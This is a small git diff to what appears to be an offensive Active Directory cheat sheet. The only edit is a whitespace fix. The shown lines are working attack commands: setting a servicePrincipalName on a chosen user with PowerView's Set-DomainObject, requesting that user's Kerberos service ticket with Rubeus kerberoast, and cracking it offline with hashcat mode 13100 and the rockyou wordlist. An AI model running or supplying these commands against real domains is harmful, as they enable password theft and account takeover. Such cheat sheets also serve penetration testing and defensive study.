@@ -179,7 +179,7 @@ Set-DomainObject -Credential $Cred -Identity <specific user> -SET @{serviceprinc
 <# Kerberoasting #>
 .\Rubeus.exe kerberoast /user:<specific user> /nowrap
 <# password recovery #>
- .\hashcat.exe -a 0 -m 13100 .\hash .\rockyou.txt
+.\hashcat.exe -a 0 -m 13100 .\hash .\rockyou.txt
 ```
 
 ### :open_file_folder: PowerView
